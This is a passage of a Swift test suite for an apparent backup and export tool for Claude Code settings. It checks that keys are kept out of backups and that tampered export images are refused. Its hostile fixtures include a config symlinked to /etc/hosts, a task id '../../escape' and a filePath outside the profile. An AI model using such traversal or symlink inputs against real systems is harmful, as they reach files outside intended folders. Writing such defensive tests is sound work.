              "key scan: the script that holds a key, the skill whose script holds one (the unit goes whole) and the marketplaces file that holds one are not in the backup, neither listed nor on disk")
        check(relsK.isSuperset(of: ["setup/hooks/clean.sh", "setup/hooks/status.sh", "setup/skills/ok/SKILL.md", "setup/skills/ok/run.sh", "setup/plugins/installed_plugins.json", "setup/CLAUDE.md", "setup/settings.json"]),
              "key scan: the scripts and units without a key, and the plugin list, are kept: \(relsK.sorted())")
        check(!relsK.contains("setup/hooks/wide.sh") && !fm.fileExists(atPath: dirK + "/setup/hooks/wide.sh") && bK.secretLeftOut?.contains("script hooks/wide.sh") == true,
              "key scan: a script saved as UTF-16 (byte order mark, a zero between letters) that holds a key is found, left out and listed")
        check(bK.secretLeftOut == ["script hooks/keyed.sh", "script hooks/wide.sh", "skill guard", "the plugin marketplaces"] && bK.leftOut >= 5 && bK.cloned + bK.copied == bK.items.count - 1,
              "key scan: the manifest names what was left out (\(bK.secretLeftOut ?? [])); the counts follow what is in it (left out \(bK.leftOut), cloned \(bK.cloned) + copied \(bK.copied) for \(bK.items.count) items)")
        let mK = SessionsBackup.load(profile: "k", id: bK.id, place: place)
        check(mK?.secretBlanked == bK.secretBlanked && mK?.secretLeftOut == bK.secretLeftOut && mK?.envBlanked == true && !(mK?.setupLeftOut ?? []).contains { $0.contains("keyed.sh") },
              "key scan: backup.json says the same when read back; the left-out names are in their own field")
        check(allKeys.allSatisfy { k in !(fm.contents(atPath: dirK + "/backup.json").map { $0.range(of: Data(k.utf8)) != nil } ?? true) } && !(read(dirK + "/backup.json") ?? "").contains("echo"),
              "key scan: backup.json holds names only, never a value")
        // nothing of the originals changed
        check(read(cK + "/hooks/keyed.sh")?.contains(ghK) == true && json(fm.contents(atPath: cK + "/settings.json")) .map { same($0, origSettingsK) } == true && fm.fileExists(atPath: cK + "/plugins/known_marketplaces.json"),
              "key scan: the originals are untouched")

        // Restore: the row says which keys were blank and what was left out; the backup's settings.json comes back blank
        // (folders of their own: target() empties the ones it is given, and .claude-k is the source; the profile is the backup's)
        let (tKr, _, cKr) = target("kr")
        let tK = SessionsRestore.Target(profile: "k", dataDir: tKr.dataDir, codeDir: tKr.codeDir, inUse: tKr.inUse)
        let bkK = SessionsRestore.Backup(profile: "k", id: bK.id, place: place)
        let prK = SessionsRestore.plan(tK, bkK, addSetup: true)
        check(prK.refusal == nil && prK.setup.keysBlanked == bK.secretBlanked! && prK.setup.keysLeftOut == bK.secretLeftOut!,
              "restore: the plan carries the blanked keys' names and the left-out names: \(prK.refusal ?? "ok") \(prK.setup.keysBlanked) \(prK.setup.keysLeftOut)")
        let wordsB = SetupRow.keysBlankedWords(prK.setup.keysBlanked), wordsL = SetupRow.keysLeftOutWords(prK.setup.keysLeftOut)
        let wordsH = SetupRow.hooksDroppedWords(prK.setup.hooksDropped), wordsR = SetupRow.rulesDroppedWords(prK.setup.rulesDropped)
        check(prK.setup.hooksDropped == bK.secretHooksDropped! && prK.setup.rulesDropped == bK.secretRulesDropped!,
              "restore: the plan carries the dropped hooks' and rules' names: \(prK.setup.hooksDropped) \(prK.setup.rulesDropped)")
        check(wordsB == "settings.json held 4 keys (apiKeyHelper, enabledPlugins.(a key), nested.deep.token, nested.list[0][0]): left blank in backups, the names stay. A key travels only in an encrypted export of the profile as it is now."
              && wordsL == "script hooks/keyed.sh, script hooks/wide.sh, skill guard, the plugin marketplaces held a key: left out of backups; they travel only in the encrypted export of the profile as it is now."
              && wordsH == "3 hooks held a key: left out of backups (Notification, PostToolUse (Edit), PreToolUse (Bash)); they travel only in the encrypted export of the profile as it is now."
              && wordsR == "2 permission rules held a key: left out of backups (permissions.allow[1], permissions.ask[0]); they travel only in the encrypted export of the profile as it is now."
              && SetupRow.hooksDroppedWords(["Stop"]) == "a hook held a key: left out of backups (Stop); it travels only in the encrypted export of the profile as it is now."
              && SetupRow.keysLeftOutWords(["the plugin marketplaces"]).contains("; it travels only")
              && allKeys.allSatisfy { !wordsB.contains($0) && !wordsL.contains($0) && !wordsH.contains($0) && !wordsR.contains($0) },
              "restore row: the words name the keys' places, the hooks, the rules and the files, never a value: \(wordsB) / \(wordsL) / \(wordsH) / \(wordsR)")
        check(SetupRow.keysBlankedWords(["apiKeyHelper"]).hasPrefix("settings.json held a key (apiKeyHelper): left blank in backups"), "restore row: one key says \"a key\"")
        let rrK = try! SessionsRestore.run(tK, bkK, addSetup: true, windowClosed: { true })
        check(allKeys.allSatisfy { (read(cKr + "/settings.json") ?? "").contains($0) == false } && holds(cKr, ghK).isEmpty && holds(cKr, awsK).isEmpty && !fm.fileExists(atPath: cKr + "/hooks/keyed.sh")
              && !fm.fileExists(atPath: cKr + "/plugins/known_marketplaces.json") && fm.fileExists(atPath: cKr + "/hooks/clean.sh") && (json(fm.contents(atPath: cKr + "/settings.json"))?["apiKeyHelper"] as? String) == "",
              "restore: the blank settings.json and the scripts that were kept come back; nothing of a key; the left-out ones are not there")
        _ = try? SessionsRestore.undo(rrK.id, windowClosed: { true })

        // Export from this plain backup: the page says the image lacks them
        let kPart = SessionsExport.Part(profile: "k", name: "K", backup: bkK)
        let kpv = SessionsExport.preview(kPart)!
        let kNotesImg = ExportWords.setupNotes(kpv, setup: true, image: true), kNotesZip = ExportWords.setupNotes(kpv, setup: true, image: false)
        check(kpv.setup.keysBlanked == bK.secretBlanked! && kpv.setup.keysLeftOut == bK.secretLeftOut!
              && kNotesImg.contains { $0 == "settings.json comes with 4 values blank where a backup found a key (apiKeyHelper, enabledPlugins.(a key), nested.deep.token, nested.list[0][0]). Export the profile as it is now to carry the keys." }
              && kNotesImg.contains { $0 == "settings.json comes without 5 hooks and permission rules that held a key (Notification, PostToolUse (Edit), PreToolUse (Bash), permissions.allow[1], …and 1 more): a backup doesn't keep one. Export the profile as it is now to carry them." }
              && kNotesImg.contains { $0 == "script hooks/keyed.sh, script hooks/wide.sh, skill guard, the plugin marketplaces held a key and isn't in the backup, so the image lacks them: export the profile as it is now to carry them." }
              && !kNotesZip.contains { $0.contains("held a key") || $0.contains("found a key") },
              "export (from a plain backup): the page says which values are blank and which files the image lacks (an image only): \(kNotesImg)")
        let kDmg = URL(fileURLWithPath: out + "/K-from-backup.dmg")
        if (try? SessionsExport.run(SessionsExport.Job(parts: [kPart], keys: .leaveOut, password: pw, destination: kDmg, rootName: "k-from-backup", place: place))) != nil,
           let ok = try? SessionsImport.open(kDmg, password: pw, place: place) {
            let km = ok.parts[0].manifest
            check(allKeys.allSatisfy { holds(ok.tree.path, $0).isEmpty } && km.secretBlanked == bK.secretBlanked && km.secretLeftOut == bK.secretLeftOut
                  && km.secretHooksDropped == bK.secretHooksDropped && km.secretRulesDropped == bK.secretRulesDropped
                  && !km.items.contains { $0.path.hasSuffix("keyed.sh") || $0.path.contains("skills/guard/") || $0.path.hasSuffix("known_marketplaces.json") },
                  "export (image from a plain backup): none of the keys, the blanked and left-out names in its manifest, the left-out files not in it")
            SessionsImport.discard(ok.work)
        } else { check(false, "export (image from a plain backup with keys): made and opens") }

        // The export image of the profile as it is now, the hidden export copy and an import's staged backup keep every key
        let nowPart = SessionsExport.Part(profile: "k", name: "K", source: srcK)
        let nowDmg = URL(fileURLWithPath: out + "/K-now.dmg")
        if (try? SessionsExport.run(SessionsExport.Job(parts: [nowPart], keys: .leaveOut, password: pw, destination: nowDmg, rootName: "k-now", place: place))) != nil,
           let on = try? SessionsImport.open(nowDmg, password: pw, place: place) {
            let nm = on.parts[0].manifest
            let kept = Set(nm.items.map(\.path))
            check(nm.secretBlanked == nil && nm.secretLeftOut == nil && nm.secretHooksDropped == nil && nm.secretRulesDropped == nil && !holds(on.tree.path, ghK).isEmpty && !holds(on.tree.path, awsK).isEmpty && !holds(on.tree.path, skK).isEmpty && !holds(on.tree.path, jwtK).isEmpty
                  && kept.isSuperset(of: ["setup/hooks/keyed.sh", "setup/skills/guard/run.sh", "setup/plugins/known_marketplaces.json", "setup/settings.json"]),
                  "export (image of the profile as it is now): every key, the script, the skill and the marketplaces file are carried, as before: \(allKeys.map { holds(on.tree.path, $0).count }) \(kept.sorted())")
            let stK = try! SessionsImport.materialize(on, part: on.parts[0], target: "k2")
            let loadedK = SessionsBackup.load(profile: "k2", id: stK.id, place: stK.stage)
            check(!holds(stK.backup.dir.path, ghK).isEmpty && !holds(stK.backup.dir.path, skK).isEmpty && loadedK?.secretBlanked == nil && loadedK?.secretLeftOut == nil && loadedK?.secretHooksDropped == nil && loadedK?.secretRulesDropped == nil && loadedK?.envBlanked == nil
                  && !(read(stK.backup.dir.path + "/setup/settings.json") ?? "").isEmpty && holds(stK.backup.dir.path, "check?token=").count == 1,
                  "import (image): the staged backup keeps what the image brought, keys included, and says nothing of blanked keys")
            let (tK2, _, _) = target("k2")
            let prK2 = SessionsRestore.plan(tK2, stK.backup, addSetup: true)
            check(prK2.setup.keysBlanked.isEmpty && prK2.setup.keysLeftOut.isEmpty && !prK2.setup.envBlanked, "import (image): its setup row has no blanked-key line and no left-out line")
            SessionsImport.discard(on.work)
        } else { check(false, "export (image of the profile as it is now): made and opens") }
        let xK = try! SessionsBackup.make(srcK, kind: .manual, window: false, place: place, forExport: true)
        let xdir = SessionsBackup.folder(profile: "k", place: place).appendingPathComponent(xK.id).path
        check(xK.secretBlanked == nil && xK.secretLeftOut == nil && xK.secretHooksDropped == nil && xK.secretRulesDropped == nil && holds(xdir, "check?token=").count == 1 && !holds(xdir, ghK).isEmpty && !holds(xdir, skK).isEmpty && !holds(xdir, awsK).isEmpty && !holds(xdir, jwtK).isEmpty,
              "backup (the hidden export copy): keeps everything for the image, keys included: \(xK.secretBlanked ?? []) \(xK.secretLeftOut ?? []) \(allKeys.map { holds(xdir, $0).count })")

        // a settings.json and files without a key: nothing blanked, nothing left out, every file as it was
        plantK(keyed: false)
        let origCleanK = json(fm.contents(atPath: cK + "/settings.json"))!
        let bC = try! SessionsBackup.make(srcK, kind: .manual, window: false, place: place)
        let dirC = SessionsBackup.folder(profile: "k", place: place).appendingPathComponent(bC.id).path
        var wantC = origCleanK; wantC["env"] = ["PLAIN": ""]
        check(bC.secretBlanked == nil && bC.secretLeftOut == nil && bC.secretHooksDropped == nil && bC.secretRulesDropped == nil && fm.fileExists(atPath: dirC + "/setup/hooks/wide.sh") && same(json(fm.contents(atPath: dirC + "/setup/settings.json")) ?? [:], wantC)
              && fm.contents(atPath: dirC + "/setup/hooks/keyed.sh") == fm.contents(atPath: cK + "/hooks/keyed.sh") && fm.contents(atPath: dirC + "/setup/plugins/known_marketplaces.json") == fm.contents(atPath: cK + "/plugins/known_marketplaces.json")
              && fm.contents(atPath: dirC + "/setup/skills/guard/run.sh") == fm.contents(atPath: cK + "/skills/guard/run.sh") && bC.cloned + bC.copied == bC.items.count - 1,
              "key scan: with no key anywhere, settings.json is as it was but for env, every script and file is kept byte for byte, and no name is listed")
        let prC = SessionsRestore.plan(tK, SessionsRestore.Backup(profile: "k", id: bC.id, place: place), addSetup: true)
        check(prC.setup.keysBlanked.isEmpty && prC.setup.keysLeftOut.isEmpty && prC.setup.envBlanked, "restore: no key lines on the row when none was found")
        // a settings.json value that only looks near a key (a short sk- word, a word that merely contains one) is not a match
        check(Setup.secretsBlanked(Data(#"{"a":"task-fix-the-login-page-for-users","b":"mask_ghp_short","c":"sk-short","d":["ok",1,true,null,{"e":2.5}]}"#.utf8))?.keys == [],
              "key scan: the same shapes as the Export page's: a near miss (a task word, a short key, a number, a null) is not blanked")
        // the older hook shape (the hook is the group itself), a hooks value that isn't an object, and a matcher that is itself a match
        let oldShape = Setup.secretsBlanked(Data("{\"hooks\":{\"Stop\":[{\"command\":\"echo \(ghK)\"},{\"command\":\"echo ok\"}],\"Pre\":[{\"matcher\":\"\(skK)\",\"hooks\":[{\"type\":\"command\",\"command\":\"x\"}]}]},\"permissions\":{\"allow\":[\"a\",\"\(skK)\"],\"deny\":[\"d\"]}}".utf8))
        let oldHooks = (json(oldShape?.data)?["hooks"] as? [String: Any]) ?? [:]
        check(oldShape?.hooks == ["Pre (a matcher)", "Stop"] && Set(oldHooks.keys) == ["Stop"] && (oldHooks["Stop"] as? [[String: Any]])?.count == 1 && oldShape?.rules == ["permissions.allow[1]"],
              "key scan: a hook in the older shape is dropped on its own, a group whose matcher holds a key goes whole (named \"a matcher\", never the key): \(oldShape?.hooks ?? [])")
        check(Setup.secretsBlanked(Data("{\"hooks\":\"\(ghK)\"}".utf8))?.hooks == ["hooks"] && json(Setup.secretsBlanked(Data("{\"hooks\":\"\(ghK)\"}".utf8))?.data)?["hooks"] == nil,
              "key scan: a hooks value that isn't an object and holds a key goes whole")
        try? fm.removeItem(atPath: cK)
    }

    // ---- General ▸ Backups: the one-time line for a place the person picked (once per place, so a second folder gets it again)
    do {
        let shared = BackupPrefs.shared
        let a = w + "/picked-a", b = w + "/picked-b"
        let wasPlace = shared.place
        check(!BackupPrefs.noteDue(place: ""), "backups line: cl_audit's own folder (the default) never shows the one-time line")
        check(BackupPrefs.noteDue(place: a) && BackupPrefs.noteDue(place: b), "backups line: a folder the person picked shows it until dismissed")
        shared.dismissNote(place: a)
        check(!BackupPrefs.noteDue(place: a) && !BackupPrefs.noteDue(place: a + "/") && !BackupPrefs.noteDue(place: a + "/../picked-a") && BackupPrefs.noteDue(place: b),
              "backups line: dismissed for that folder (also another spelling of it), still shown for another")
        shared.dismissNote(place: b)
        check(!BackupPrefs.noteDue(place: a) && !BackupPrefs.noteDue(place: b), "backups line: each folder is remembered on its own")
        let nl = w + "/picked\nnewline"
        check(BackupPrefs.noteDue(place: nl), "backups line: a folder whose name holds a newline shows it")
        shared.dismissNote(place: nl)
        check(!BackupPrefs.noteDue(place: nl) && BackupPrefs.noteSeen().count == 3, "backups line: and can be dismissed (the list is kept as JSON, not as lines)")
        shared.dismissNote(place: ""); check(BackupPrefs.noteSeen().count == 3, "backups line: dismissing the default place remembers nothing")
        for i in 0..<25 { shared.dismissNote(place: w + "/picked-n\(i)") }
        check(BackupPrefs.noteSeen().count == 20 && !BackupPrefs.noteDue(place: w + "/picked-n24") && BackupPrefs.noteDue(place: a), "backups line: the last 20 folders are remembered, no more")
        shared.reload()
        check(BackupPrefs.pickedNote.contains("copies of Claude Code's settings and scripts") && BackupPrefs.pickedNote.contains("A key found in settings.json or a script its hooks run is left out") && !BackupPrefs.pickedNote.contains("Any key") && BackupPrefs.pickedNote.contains("once for each folder"),
              "backups line: the words")
        shared.place = wasPlace
    }

    // ---- an export never makes a file its own import refuses: a config over 8 MB (or a link, or not JSON) is left out at the source
    let big: [String: Any] = ["mcpServers": ["x": ["command": "x"]], "pad": String(repeating: "a", count: (8 << 20) + 16)]
    try! JSONSerialization.data(withJSONObject: big).write(to: URL(fileURLWithPath: dataA + "/claude_desktop_config.json"))
    let bpv = SessionsExport.preview(part)!
    check(!bpv.config.present && bpv.config.leftOut == "it is over 8 MB" && ExportWords.mcpWords(bpv, image: true).value == "claude_desktop_config.json left out (it is over 8 MB)",
          "export: a claude_desktop_config.json over 8 MB is left out at the source, and the page says so: \(ExportWords.mcpWords(bpv, image: true).value)")
    let bigURL = URL(fileURLWithPath: out + "/A-big.dmg")
    if (try? SessionsExport.run(SessionsExport.Job(parts: [part], keys: .leaveOut, password: pw, destination: bigURL, rootName: "a-big", place: place))) != nil {
        let o = try? SessionsImport.open(bigURL, password: pw, place: place)
        check(o != nil && o?.parts[0].manifest.items.contains { $0.role == .config } == false && o?.parts[0].manifest.configLeftOut == "it is over 8 MB", "export (image): made without it, and its own import opens it")
        if let o { SessionsImport.discard(o.work) }
    } else { check(false, "export (image) with a config over 8 MB at the source: made") }
    write(dataA + "/claude_desktop_config.json", "not json {")
    check(SessionsBackup.windowConfig(dataDir: dataA) == .leftOut("it isn't a JSON object"), "export: a config that isn't a JSON object is left out")
    try? fm.removeItem(atPath: dataA + "/claude_desktop_config.json"); write(w + "/elsewhere-config.json", #"{"mcpServers":{}}"#)
    symlink(w + "/elsewhere-config.json", dataA + "/claude_desktop_config.json")
    check(SessionsBackup.windowConfig(dataDir: dataA) == .leftOut("it is a link"), "export: a config that is a link is never followed")
    plantA()

    // ---- doctored images
    /// A copy of the image, edited and made again: the file, or why it couldn't be made.
    func doctoredFile(_ name: String, zip: Bool = false, edit: (inout SessionsBackup.Manifest, inout ExportManifest, URL) throws -> Void) -> (file: URL?, why: String) {
        let work = w + "/doctor-\(name)"
        try? fm.removeItem(atPath: work); try! fm.createDirectory(atPath: work, withIntermediateDirectories: true)
        _ = Tool.run("/usr/bin/ditto", [oi.tree.path, work + "/" + oi.tree.lastPathComponent])
        let root = URL(fileURLWithPath: work + "/" + oi.tree.lastPathComponent)
        let dec = JSONDecoder(); dec.dateDecodingStrategy = .iso8601
        let enc = JSONEncoder(); enc.dateEncodingStrategy = .iso8601; enc.outputFormatting = [.prettyPrinted, .sortedKeys, .withoutEscapingSlashes]
        do {
            var m = try dec.decode(SessionsBackup.Manifest.self, from: Data(contentsOf: root.appendingPathComponent("profiles/p1/backup.json")))
            var ex = try dec.decode(ExportManifest.self, from: Data(contentsOf: root.appendingPathComponent("export.json")))
            try edit(&m, &ex, root.appendingPathComponent("profiles/p1"))
            m.bytes = m.items.reduce(0) { $0 + $1.bytes }
            try enc.encode(m).write(to: root.appendingPathComponent("profiles/p1/backup.json"))
            ex.parts[0].bytes = m.bytes; ex.bytes = m.bytes
            if zip { ex.container = "zip" }
            try enc.encode(ex).write(to: root.appendingPathComponent("export.json"))
        } catch { return (nil, "doctoring failed: \(error)") }
        let file = URL(fileURLWithPath: out + "/\(name).\(zip ? "zip" : "dmg")")
        try? fm.removeItem(at: file)
        // a volume name per image and per process: two hdiutil creates with one name at once (another suite, another worktree) fail with
        // status 1 and no message; and one retry on a failure, the half-made file removed first
        let vol = "doctored-\(name)-\(getpid())"
        var r: Tool.Output?
        for _ in 0..<2 {
            r = zip ? Tool.run("/usr/bin/ditto", ["-c", "-k", "--norsrc", "--noextattr", "--keepParent", root.path, file.path])
                    : Tool.run("/usr/bin/hdiutil", ["create", "-srcfolder", work, "-volname", vol, "-fs", "APFS", "-format", "UDZO", "-encryption", "AES-256", "-stdinpass", "-quiet", file.path], stdin: Data(pw.utf8), secret: pw)
            if r?.status == 0 { break }
            try? fm.removeItem(at: file)
        }
        guard r?.status == 0 else { return (nil, "file not made (status \(r.map { String($0.status) } ?? "none")): \(r?.err ?? "") \(r?.out ?? "")") }
        return (file, "")
    }
    /// A doctored image opened by the import: "OPENED", or why it was refused.
    func doctored(_ name: String, zip: Bool = false, edit: (inout SessionsBackup.Manifest, inout ExportManifest, URL) throws -> Void) -> String {
        let made = doctoredFile(name, zip: zip, edit: edit)
        guard let file = made.file else { return made.why }
        do { let x = try SessionsImport.open(file, password: zip ? nil : pw, place: place); SessionsImport.discard(x.work); return "OPENED" } catch { return "\(error)" }
    }
    func setConfig(_ m: inout SessionsBackup.Manifest, _ p: URL, _ data: Data) throws {
        try data.write(to: p.appendingPathComponent("config/claude_desktop_config.json"))
        if let i = m.items.firstIndex(where: { $0.role == .config }) { m.items[i].bytes = Int64(data.count) }
    }
    check(doctored("w-ok") { _, _, _ in } == "OPENED", "(an untouched copy of the image opens)")
    // the window's own folders (backlog/, waiting-input/) stay in this Mac's backups: an export naming them is refused whole
    let extraNamed = doctored("w-window-extra") { m, _, _ in
        m.windowExtra = [SessionsBackup.Item(role: .window, original: "x", path: "window-extra/\(sid(1))/\(sid(2))/backlog/tasks.json", bytes: 2)]
    }
    check(extraNamed.contains("names window files an export doesn't carry"), "hostile (image): a backup.json naming the window's backlog or waiting input is refused whole: \(extraNamed.prefix(90))")

    // ---- an older build's export (26.11.42 and earlier): a window file named like an entry but not one, run by a task this import
    // leaves out, with its transcript, and counted as a session. This build's import counts the entries alone, and the odd file never
    // holds a transcript back (only a real entry of a task left out does)
    do {
        let made = doctoredFile("w-older-odd") { m, _, p in
            guard let e = m.items.first(where: { $0.role == .window && ($0.path as NSString).lastPathComponent.hasPrefix("local_") }),
                  let t = m.items.first(where: { $0.role == .transcript && $0.path.hasSuffix(".jsonl") }) else { throw CocoaError(.fileNoSuchFile) }
            let ec = e.path.split(separator: "/").map(String.init), tc = t.path.split(separator: "/").map(String.init)
            let odd = "window/\(ec[1])/\(ec[2])/local_notanid.json"
            let oddBody = #"{"sessionId":"local_notanid","cliSessionId":"\#(sid(140))","scheduledTaskId":"nightly-digest"}"#
            let tr = "transcripts/\(tc[1])/\(sid(140)).jsonl"
            let trBody = #"{"type":"user","cwd":"/w/project","text":"odd"}"# + "\n"
            write(p.path + "/" + odd, oddBody); write(p.path + "/" + tr, trBody)
            m.items.append(SessionsBackup.Item(role: .window, original: odd, path: odd, bytes: Int64(oddBody.utf8.count)))
            m.items.append(SessionsBackup.Item(role: .transcript, original: tr, path: tr, bytes: Int64(trBody.utf8.count)))
            m.counts.sessions += 1; m.counts.transcripts += 1                   // as an older build counted them
        }
        if let file = made.file, let o = try? SessionsImport.open(file, password: pw, place: place) {
            let (tX, _, _) = target("x")
            do {
                let st = try SessionsImport.materialize(o, part: o.parts[0], target: "x")
                let mX = SessionsBackup.load(profile: "x", id: st.id, place: st.stage)
                let entries = mX?.items.filter { $0.role == .window && ClaudeFiles.isEntryName(($0.path as NSString).lastPathComponent) }.count ?? -1
                check(mX?.counts.sessions == entries && entries == 2 && mX?.items.contains { $0.path.hasSuffix("/local_notanid.json") } == true,
                      "import (older file): the sessions counted by the entries alone (\(mX?.counts.sessions ?? -1), not the file's own claim of 3); the odd file kept as it came")
                let pX = SessionsRestore.plan(tX, st.backup)
                let leaves = pX.transcripts.map(\.leaf)
                let written = pX.entries + pX.tasks + pX.configPieces + pX.folderFiles
                check(pX.refusal == nil && leaves.contains("\(sid(140)).jsonl") && !leaves.contains("\(sid(111)).jsonl") && pX.taskSessions.count == 1
                      && mX?.items.contains { $0.path.hasSuffix("/\(sid(111)).jsonl") } == true && !written.contains { $0.leaf == "local_notanid.json" },
                      "restore (older file): only a real entry of a task left out holds its transcript back; the odd file holds nothing and is never written: \(leaves)")
            } catch { check(false, "import (older file): staged: \(error)") }
            SessionsImport.discard(o.work)
        } else { check(false, "import (older file): made and opens: \(made.why.prefix(90))") }
    }
    let huge = doctored("w-huge-config") { m, _, p in try setConfig(&m, p, Data(("{\"pad\":\"" + String(repeating: "a", count: (8 << 20) + 16) + "\"}").utf8)) }
    check(huge.contains("over 8 MB"), "hostile (image): a claude_desktop_config.json over 8 MB is refused whole, never read: \(huge.prefix(90))")
    let notJSON = doctored("w-config-not-json") { m, _, p in try setConfig(&m, p, Data("not json at all".utf8)) }
    check(notJSON.contains("isn't a JSON object"), "hostile (image): a config that isn't a JSON object is refused whole: \(notJSON.prefix(90))")
    let arrayJSON = doctored("w-config-array") { m, _, p in try setConfig(&m, p, Data("[1,2,3]".utf8)) }
    check(arrayJSON.contains("isn't a JSON object"), "hostile (image): a config that is JSON but not an object is refused whole: \(arrayJSON.prefix(90))")
    let linked = doctored("w-config-link") { m, _, p in
        let c = p.appendingPathComponent("config/claude_desktop_config.json")
        try fm.removeItem(at: c); symlink("/etc/hosts", c.path)
    }
    check(linked != "OPENED" && linked.contains("link"), "hostile (image): a config that is a link is refused whole, never followed: \(linked.prefix(90))")
    let folder = doctored("w-config-folder") { m, _, p in
        let c = p.appendingPathComponent("config/claude_desktop_config.json")
        try fm.removeItem(at: c); try fm.createDirectory(at: c, withIntermediateDirectories: true); try Data("x".utf8).write(to: c.appendingPathComponent("inside.json"))
    }
    check(folder != "OPENED", "hostile (image): a folder where the config should be is refused whole: \(folder.prefix(90))")
    let elsewhere = doctored("w-config-elsewhere") { m, _, p in
        try fm.moveItem(at: p.appendingPathComponent("config/claude_desktop_config.json"), to: p.appendingPathComponent("config/settings.json"))
        if let i = m.items.firstIndex(where: { $0.role == .config }) { m.items[i].path = "config/settings.json" }
    }
    check(elsewhere.contains("in a place an export doesn't keep it"), "hostile (image): a config under another name or place is refused whole: \(elsewhere.prefix(90))")
    let inZip = doctored("w-config-in-zip", zip: true) { _, _, _ in }
    check(inZip.contains("A zip carries no MCP settings"), "hostile (zip): a zip that holds the config is refused whole: \(inZip.prefix(90))")
    let v2config = doctored("w-v2-with-config") { m, ex, _ in m.version = 2; ex.version = 2 }
    check(v2config.contains("in a place an export doesn't keep it") || v2config.contains("doesn't carry"), "format: a version 2 file can't hold the config or a task's prompt (they came with 3): refused: \(v2config.prefix(90))")
    let v2 = doctored("w-v2") { m, ex, p in
        m.version = 2; ex.version = 2
        for it in m.items where it.role == .config || it.path.hasPrefix("setup/scheduled-tasks/") { try fm.removeItem(at: p.appendingPathComponent(it.path)) }
        m.items.removeAll { $0.role == .config || $0.path.hasPrefix("setup/scheduled-tasks/") }
        try fm.removeItem(at: p.appendingPathComponent("config")); try fm.removeItem(at: p.appendingPathComponent("setup/scheduled-tasks"))
    }
    check(v2 == "OPENED", "format: a version 2 file (setup, no window settings) is read: \(v2.prefix(90))")
    let v5 = doctored("w-v5") { m, ex, _ in m.version = 5; ex.version = 5 }
    check(v5.contains("newer cl_audit"), "format: a version 5 file is refused with the newer-cl_audit words: \(v5.prefix(90))")
    let orphan = doctored("w-prompt-without-task") { m, _, p in
        let data = Data("a prompt no task names\n".utf8)
        try fm.createDirectory(at: p.appendingPathComponent("setup/scheduled-tasks/orphan-prompt"), withIntermediateDirectories: true)
        try data.write(to: p.appendingPathComponent("setup/scheduled-tasks/orphan-prompt/SKILL.md"))
        m.items.append(SessionsBackup.Item(role: .setup, original: "setup/scheduled-tasks/orphan-prompt/SKILL.md", path: "setup/scheduled-tasks/orphan-prompt/SKILL.md", bytes: Int64(data.count), sha: SwitchEngine.sha(data)))
    }
    check(orphan.contains("without its task"), "hostile (image): a task's prompt whose task isn't in the file is refused whole: \(orphan.prefix(90))")
    let notesFile = doctored("w-task-other-file") { m, _, p in
        let data = Data("#!/bin/sh\n".utf8)
        try data.write(to: p.appendingPathComponent("setup/scheduled-tasks/nightly-digest/watching.js"))
        m.items.append(SessionsBackup.Item(role: .setup, original: "setup/scheduled-tasks/nightly-digest/watching.js", path: "setup/scheduled-tasks/nightly-digest/watching.js", bytes: Int64(data.count), sha: SwitchEngine.sha(data)))
    }
    check(notesFile.contains("doesn't carry"), "hostile (image): another file in a task's folder (watching.js) is refused whole: \(notesFile.prefix(90))")
    let execPrompt = doctored("w-task-exec") { m, _, _ in
        if let i = m.items.firstIndex(where: { $0.path == "setup/scheduled-tasks/nightly-digest/SKILL.md" }) { m.items[i].exec = true }
    }
    check(execPrompt.contains("executable"), "hostile (image): a task's prompt marked executable is refused whole: \(execPrompt.prefix(90))")
    // a crafted task: an id that climbs out, a filePath outside, a task that isn't an object: opens (the file's tasks are only data),
    // and none of them is ever written; nothing lands outside the profile's folders
    let craftedName = "w-crafted-tasks"
    let crafted = doctored(craftedName) { m, _, p in
        guard let it = m.items.first(where: { $0.role == .window && $0.path.hasSuffix("/scheduled-tasks.json") }) else { return }
        let f = p.appendingPathComponent(it.path)
        var j = json(try Data(contentsOf: f)) ?? [:]
        var list = (j["scheduledTasks"] as? [Any]) ?? []
        list.append(["id": "../../escape", "displayName": "Climb", "enabled": true])
        list.append(["id": "outside-path", "displayName": "Outside", "enabled": true, "filePath": "/private/tmp/w-escape/SKILL.md"])
        list.append(["id": "number-path", "displayName": "Number path", "enabled": true, "filePath": 5])
        list.append(["id": "no-path", "displayName": "No path", "enabled": true])
        list.append("not an object")
        list.append(["displayName": "No id", "enabled": true])
        j["scheduledTasks"] = list
        let data = try JSONSerialization.data(withJSONObject: j, options: [.prettyPrinted, .sortedKeys])
        try data.write(to: f)
        if let i = m.items.firstIndex(where: { $0.path == it.path }) { m.items[i].bytes = Int64(data.count) }
    }
    check(crafted == "OPENED", "hostile (image): crafted tasks in the task file are only data: the file opens (\(crafted.prefix(80)))")
    if crafted == "OPENED", let oc = try? SessionsImport.open(URL(fileURLWithPath: out + "/\(craftedName).dmg"), password: pw, place: place) {
        let (tG, dG, cG) = target("g")
        let stG = try! SessionsImport.materialize(oc, part: oc.parts[0], target: "g")
        let pG = SessionsRestore.plan(tG, stG.backup, addTasks: true)
        check(pG.taskPlan.tasks.first { $0.id == "number-path" }?.why == "it doesn't say where its prompt is" && pG.taskPlan.tasks.first { $0.id == "no-path" }?.why == "it doesn't say where its prompt is",
              "hostile: a task whose filePath isn't a string, or that has none, isn't added (listed)")
        check(pG.taskPlan.tasks.first { $0.id.contains("escape") }?.why == "its id isn't one the Claude window keeps" && pG.taskPlan.tasks.first { $0.id == "outside-path" }?.why != nil
              && pG.taskPlan.coming.map(\.id) == ["nightly-digest", "weekly-report"], "hostile: a climbing id and a filePath outside are listed and not added: \(pG.taskPlan.tasks.map { "\($0.id):\($0.why ?? "ok")" })")
        let bG = try! SessionsImport.commit(stG)
        _ = try? SessionsRestore.run(tG, bG, addTasks: true, windowClosed: { true })
        let written = SessionsRestore.taskList(fm.contents(atPath: "\(dG)/claude-code-sessions/\(sid(3))/\(sid(4))/scheduled-tasks.json") ?? Data()).map { $0["id"] as? String ?? "" }
        check(written == ["nightly-digest", "weekly-report"] && !fm.fileExists(atPath: "/private/tmp/w-escape") && !fm.fileExists(atPath: w + "/escape") && files(cG).allSatisfy { !$0.contains("escape") },
              "hostile: only the 2 proper tasks are written; nothing outside the profile's folders: \(written)")
        SessionsImport.discard(oc.work)
    }

    // an OLD image (26.11.61 and earlier carried the whole file but its sidebar part; this crafted one even carries that part, with
    // its folder permission modes): permission opt-ins, trusted folders, consents, this Mac's paths and keys a later app adds, at the
    // top level and under preferences. The import plan names them as never added, and "Add them" writes the allowlist alone
    let sidebarName = "w-config-old-image"
    let withSidebar = doctored(sidebarName) { m, _, p in
        var j = config
